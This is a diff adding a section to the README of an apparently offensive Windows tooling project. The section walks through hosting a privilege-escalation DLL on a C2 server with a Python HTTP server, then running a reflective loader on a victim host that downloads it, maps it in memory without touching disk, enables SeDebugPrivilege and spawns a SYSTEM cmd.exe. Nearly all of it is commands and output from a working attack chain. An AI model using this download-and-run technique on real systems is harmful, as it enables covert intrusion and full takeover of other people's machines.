@@ -56,6 +56,46 @@ nt authority\system
 
 C:\Windows\system32>
 ```
+The scenario below demonstrates how privesc.dll can be hosted on a C2 server. This way we never touch disk with the malicious bits. First we fire up a simple python server to host the DLL.
+
+```
+$ python -m http.server 8337
+Serving HTTP on 0.0.0.0 port 8337 (http://0.0.0.0:8337/) ...
+192.168.1.32 - - [06/Feb/2026 18:40:08] "GET /privesc.dll HTTP/1.1" 200 -
+
+```
+Now, on the victim host we execute remote_dll_loader.exe.
+```
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\shawnevans>remote_dll_loader.exe http://192.168.1.10:8337/privesc.dll
+[+] Target identified as URL. Downloading...
+[+] Data acquired (434177 bytes). Starting reflective load...
+Allocated target memory base: 0x0000000002320000
+Successfully mapped headers and sections.
+Applying base relocations. Delta: 0xFFFFFFFD47430000
+Base relocations applied successfully.
+Successfully resolved Import Address Table (IAT).
+Analyzing cat paw entry point at 0x2321350...
+--- PrivEsc Operation Started ---
+[+] SeDebugPrivilege enabled successfully.
+[+] Found services.exe with PID: 492
+[***] SUCCESS: Launched SYSTEM cmd.exe! PID: 4904
+This finished. That returned: 1
+```
+This results in a new cmd.exe process with SYSTEM privileges, yay!
+```
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>tasklist | findstr cmd.exe
+cmd.exe                       3400 Console                    1      3,172 K
+cmd.exe                       4904 Console                    1      3,212 K
+```
 
 ### XOR Loader
 
